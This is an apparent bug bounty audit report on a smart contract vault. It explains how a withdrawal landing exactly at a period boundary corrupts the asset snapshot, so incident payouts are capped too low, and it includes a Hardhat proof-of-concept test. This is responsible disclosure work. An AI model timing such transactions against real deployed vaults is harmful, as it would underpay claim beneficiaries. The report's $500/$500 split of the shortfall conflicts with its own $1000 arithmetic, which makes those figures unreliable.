# 89085 sc high payout s exposure cap snapshot can be corrupted by an ordinary user s withdrawal request landing at a period boundary causing incident claims to be permanently underpaid

**Submitted on Aug 17th 2026 at 03:03:18 UTC by @Bobai for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89085
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Bug Description

`payout()` caps the amount it can pay an incident's beneficiary using a historical snapshot of vault assets taken at the start of the incident's capture period:

```solidity
// Cap by the active assets committed at the start of the covered period.
// This is an exposure cap, not a segregated asset bucket.
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 currentActiveAssets = totalAssets();
...
uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

`totalAssetsAt(capturePeriodStart)` reads from a `Checkpoints.Trace256` (`_traceTotalAssets`) that is keyed by `block.timestamp` at second-level granularity. That trace is pushed to by `redeem()`/`withdraw()` via `_logTrace(...)`, which logs `_totalAssets - assets` — i.e. the vault's active balance after the requested amount has already been moved into `pendingWithdrawAssets`:

```solidity
function redeem(...) ... {
    (uint256 assets, uint256 _totalSupply, uint256 _totalAssets) = _previewTotals(shares, false, Math.Rounding.Floor);
    uint256 ownerBalance = _requestWithdraw(assets, shares, receiver, owner);
    _logTrace(owner, ownerBalance, _totalSupply - shares, _totalAssets - assets, true); // <-- pushes checkpoint at Time.timestamp()
    return assets;
}
```

`capturePeriodStart` is a deterministic, publicly computable value. It is derived purely from the vault's on-chain `periodConfigurations` (`_periodAndStartAt`), with no dependency on the specific incident or `captureTimestamp` chosen by `PAYOUT_ROLE` (any `captureTimestamp` within period *P* resolves to the same `capturePeriodStart`).

If any user submits a `redeem()`/`withdraw()` transaction that lands in a block whose `block.timestamp` is exactly equal to `capturePeriodStart`, the checkpoint pushed by that transaction (post-withdrawal-request balance) becomes the value returned by `totalAssetsAt(capturePeriodStart)` for every future `payout()` call against that period, permanently understating `assetsAtCapturePeriod` relative to the true balance that existed at the instant the period began. No privileged role is required; this is triggerable by any ordinary depositor and requires no `hasActiveIncident` misconfiguration.

Because `_periodAndStartAt` resolves the same `capturePeriodStart` for the entire period, this single, well-timed transaction suppresses the payout cap for every incident captured anywhere in that period, not just one.

## Root Cause

`totalAssetsAt(capturePeriodStart)` is intended to represent "assets in the vault at the instant the period began," but the underlying `Checkpoints.Trace256` has only second-level timestamp granularity and no mechanism to distinguish "state at the exact period boundary, before any same-second activity" from "state after a same-second transaction that also happens to touch the trace." Any state-mutating call that pushes to `_traceTotalAssets` in the same block/second as a period boundary can become the canonical snapshot for that boundary.

## Vulnerability Condition

{% stepper %}
{% step %}

### Vault assets at the period boundary

Vault holds $2000 in active assets going into the start of period P (timestamp `T`).
{% endstep %}

{% step %}

### Withdrawal at the boundary

A user submits `redeem()`/`withdraw()` for $1000 in a block where `block.timestamp == T`.

* `totalAssets()` drops to $1000 (`super.totalAssets() - pendingWithdrawAssets`).
* `withdrawAssets[P+1]` becomes $1000.
* The `_logTrace` call in that same transaction pushes `_traceTotalAssets[T] = 1000`, overwriting/establishing the checkpoint at exactly the period-start key.
  {% endstep %}

{% step %}

### Approved claim payout

`PAYOUT_ROLE` later calls `payout(to, 2000, captureTimestamp)` for an approved $2000 incident claim captured within period P.
{% endstep %}

{% step %}

### Corrupted snapshot

`totalAssetsAt(capturePeriodStart) = totalAssetsAt(T) = 1000` (corrupted value; should be $2000).
{% endstep %}

{% step %}

### Underpayment

`paidAmount = min(2000, min(1000, 2000)) = 1000` - the claim is underpaid by $1000, even though `activePayableAmount` (currentActiveAssets + capturePeriodWithdrawals) genuinely equals $2000 and is available in the vault.
{% endstep %}

{% step %}

### Unpaid balance remains in the vault

The shortfall ($500 retained in `totalAssets()`, $500 retained in `withdrawAssets[P+1]`) is not transferred to the payout recipient; it remains distributed across active shareholders and the withdrawal-pending pool.
{% endstep %}
{% endstepper %}

## Impact

Payout recipient receives less than the approved incident amount despite sufficient real backing existing in the vault.

The shortfall stays split across active vault shares and the withdrawal-pending pool for period `capturePeriod+1`, inaccessible to the intended payout recipient.

## Proof of Concept

{% stepper %}
{% step %}

### Create a new test file

```
test/FirelightVault/vault_payout_bug_capture_snapshot.js
```

{% endstep %}

{% step %}

### Paste it

```js
const { loadFixture, time } = require("@nomicfoundation/hardhat-network-helpers");
const { deployVault } = require("../setup/fixtures.js"); // adjust path from your file's location
const { expect } = require("chai");

describe("FirelightVault payout - capture snapshot corruption", function () {
  it("underpays an incident claim when a withdrawal lands exactly at the period boundary", async () => {
    const { token_contract, firelight_vault, payout_signer, payout_receiver, users, utils, config } =
      await loadFixture(
        deployVault.bind(null, { decimals: 0n, initial_deposit_limit: 10000n })
      );

    const user = users[0];

    // Step 1: user deposits 2000 in period 1
    await utils.mintAndApprove(2000n, user);
    await firelight_vault.connect(user).deposit(2000n, user.address);

    // Step 2: figure out exactly when period 2 starts, WITHOUT advancing time yet.
    const period1Start = await firelight_vault.currentPeriodStart();
    const period2Start = period1Start + BigInt(config.period_configuration_duration);

    // Step 3: force the NEXT transaction to be mined at exactly period2Start.
    await time.setNextBlockTimestamp(period2Start);

    // This withdraw() lands in the same block as the period boundary itself.
    await firelight_vault.connect(user).withdraw(1000n, user.address, user.address);

    // Sanity checks: we should now be in period 2, and totalAssets() should
    // have dropped to 1000 (2000 balance - 1000 now pending withdrawal).
    const capturePeriod = await firelight_vault.currentPeriod();
    expect(await firelight_vault.totalAssets()).to.equal(1000n);
    expect(await firelight_vault.withdrawAssets(capturePeriod + 1n)).to.equal(1000n);

    // Step 4: THE CHECK THAT PROVES THE BUG.
    // The vault's own "assets at the start of period 2" snapshot should be 2000
    // (that's what was really there when period 2 began). Instead it reads 1000,
    // because the withdraw()'s checkpoint collided with the period-boundary timestamp.
    expect(await firelight_vault.totalAssetsAt(period2Start)).to.equal(1000n); // <-- should be 2000

    // Step 5: PAYOUT_ROLE tries to pay out the full, legitimately-backed 2000 claim.
    await expect(
      firelight_vault.connect(payout_signer).payout(payout_receiver.address, 2000n, period2Start)
    )
      .to.emit(firelight_vault, "PayoutExecuted")
      // paidAmount ends up capped at 1000, NOT 2000, even though
      // currentActiveAssets (1000) + capturePeriodWithdrawals (1000) = 2000 is available.
      .withArgs(payout_receiver.address, 2000n, 1000n, period2Start);

    expect(await token_contract.balanceOf(payout_receiver.address)).to.equal(1000n);
    // The other 1000 stays stuck in the vault split across the active pool and
    // the withdrawal-pending pool, never reaching the payout receiver.
  });

  it("control: same withdrawal one second later does NOT corrupt the snapshot", async () => {
    const { token_contract, firelight_vault, payout_signer, payout_receiver, users, utils, config } =
      await loadFixture(
        deployVault.bind(null, { decimals: 0n, initial_deposit_limit: 10000n })
      );

    const user = users[0];
    await utils.mintAndApprove(2000n, user);
    await firelight_vault.connect(user).deposit(2000n, user.address);

    const period1Start = await firelight_vault.currentPeriodStart();
    const period2Start = period1Start + BigInt(config.period_configuration_duration);

    // Advance PAST the boundary first, then withdraw — no timestamp collision.
    await time.increaseTo(period2Start + 5n);
    await firelight_vault.connect(user).withdraw(1000n, user.address, user.address);

    // This time the snapshot correctly shows 2000 was there at period start.
    expect(await firelight_vault.totalAssetsAt(period2Start)).to.equal(2000n);

    await expect(
      firelight_vault.connect(payout_signer).payout(payout_receiver.address, 2000n, period2Start)
    )
      .to.emit(firelight_vault, "PayoutExecuted")
      .withArgs(payout_receiver.address, 2000n, 2000n, period2Start); // fully paid, as it should be
  });
});
```

{% endstep %}

{% step %}

### Run it

```bash
npx hardhat test test/FirelightVault/vault_payout_bug_capture_snapshot.js
```

{% endstep %}
{% endstepper %}
